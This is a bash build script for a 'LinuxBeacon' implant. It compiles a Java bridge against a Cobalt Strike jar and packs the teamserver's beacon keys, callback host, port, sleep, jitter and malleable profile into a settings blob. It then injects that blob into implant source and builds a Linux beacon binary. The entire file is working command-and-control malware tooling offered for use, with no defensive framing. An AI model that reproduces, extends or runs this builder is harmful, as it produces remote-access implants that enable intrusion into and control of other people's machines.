#!/usr/bin/env bash
# LinuxBeacon: settings → insert_blob → make
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"

HOST="" PORT="" HTTPS=0
BEACON_KEYS="" CS_JAR="" JAVA_HOME_OPT=""
OUT_NAME="beacon" BRIDGE="jar" DEBUG=0
PROFILE="" SLEEP="" JITTER=""

usage() {
  cat <<EOF
Usage: $0 --host IP --port N --beacon-keys FILE --cs-jar JAR [options]

  --beacon-keys FILE   teamserver .cobaltstrike.beacon_keys
  --cs-jar PATH        cobaltstrike.jar or untitled.jar
  --java-home DIR      JDK root (…/bin/java)
  --bridge jar|python  default jar
  --profile FILE       malleable profile (jar only)
  --debug              implant -g -DDEBUG
  --https 0|1 --out NAME --sleep MS --jitter N
EOF
  exit 1
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --host) HOST="$2"; shift 2 ;;
    --port) PORT="$2"; shift 2 ;;
    --https) HTTPS="$2"; shift 2 ;;
    --beacon-keys) BEACON_KEYS="$2"; shift 2 ;;
    --cs-jar) CS_JAR="$2"; shift 2 ;;
    --java-home) JAVA_HOME_OPT="$2"; shift 2 ;;
    --out) OUT_NAME="$2"; shift 2 ;;
    --bridge) BRIDGE="$2"; shift 2 ;;
    --profile) PROFILE="$2"; shift 2 ;;
    --debug) DEBUG=1; shift ;;
    --sleep) SLEEP="$2"; shift 2 ;;
    --jitter) JITTER="$2"; shift 2 ;;
    -h|--help) usage ;;
    *) echo "unknown: $1"; usage ;;
  esac
done

[[ -n "$HOST" && -n "$PORT" && -n "$BEACON_KEYS" && -n "$CS_JAR" ]] || usage
[[ -f "$BEACON_KEYS" ]] || { echo "missing beacon_keys: $BEACON_KEYS"; exit 1; }
[[ -f "$CS_JAR" ]] || { echo "missing cs-jar: $CS_JAR"; exit 1; }

# Java
if [[ -n "$JAVA_HOME_OPT" ]]; then
  JAVA="$JAVA_HOME_OPT/bin/java"
  JAVAC="$JAVA_HOME_OPT/bin/javac"
elif [[ -n "${JAVA_HOME:-}" ]]; then
  JAVA="$JAVA_HOME/bin/java"
  JAVAC="$JAVA_HOME/bin/javac"
else
  JAVA="$(command -v java || true)"
  JAVAC="$(command -v javac || true)"
fi
[[ -x "${JAVA:-}" ]] || { echo "java not found (set --java-home)"; exit 127; }
[[ -x "${JAVAC:-}" ]] || { echo "javac not found (set --java-home)"; exit 127; }
echo "[env] java=$JAVA  javac=$JAVAC  debug=$DEBUG  jar=$CS_JAR"

# Bridge classes
OUT="$ROOT/tools/bridge/out"
SRC="$ROOT/tools/bridge/LinuxBeaconBridge.java"
mkdir -p "$OUT" "$ROOT/tools/fixtures" "$ROOT/implant/bin"
if [[ ! -f "$OUT/LinuxBeaconBridge.class" || "$SRC" -nt "$OUT/LinuxBeaconBridge.class" ]]; then
  echo "[bridge] compiling..."
  "$JAVAC" -encoding UTF-8 -cp "$CS_JAR" -d "$OUT" "$SRC"
fi
CP="$OUT:$CS_JAR"
BIN="$ROOT/tools/fixtures/settings.bin"
DER="$ROOT/tools/fixtures/publickey.der"

# Settings
if [[ "$BRIDGE" == "jar" ]]; then
  ARGS=(--host "$HOST" --port "$PORT" --https "$HTTPS" --out "$BIN"
        --beacon-keys "$BEACON_KEYS" --dump-der "$DER")
  if [[ -n "$PROFILE" ]]; then
    ARGS+=(--profile "$PROFILE")
  else
    ARGS+=(--default-profile)
  fi
  [[ -n "$SLEEP" ]] && ARGS+=(--sleep "$SLEEP")
  [[ -n "$JITTER" ]] && ARGS+=(--jitter "$JITTER")
  echo "[bridge] jar export..."
  "$JAVA" -cp "$CP" LinuxBeaconBridge "${ARGS[@]}"
else
  "$JAVA" -cp "$CP" LinuxBeaconBridge --beacon-keys "$BEACON_KEYS" --dump-der "$DER"
  PARGS=(--host "$HOST" --port "$PORT" --https "$HTTPS" --pubkey "$DER" --out "$BIN")
  [[ -n "$SLEEP" ]] && PARGS+=(--sleep "$SLEEP")
  [[ -n "$JITTER" ]] && PARGS+=(--jitter "$JITTER")
  echo "[bridge] python default pack..."
  python3 "$ROOT/tools/pack_settings.py" "${PARGS[@]}"
fi
[[ -f "$BIN" ]] || { echo "settings.bin not written"; exit 1; }

python3 "$ROOT/tools/insert_blob.py" "$BIN" "$ROOT/implant/src/settings_blob.inc"
make -C "$ROOT/implant" clean
if [[ "$DEBUG" -eq 1 ]]; then
  make -C "$ROOT/implant" EXTRA_CFLAGS="-g -DDEBUG" OUTPUT="$OUT_NAME"
else
  make -C "$ROOT/implant" OUTPUT="$OUT_NAME"
fi
echo "[+] $ROOT/implant/bin/$OUT_NAME"
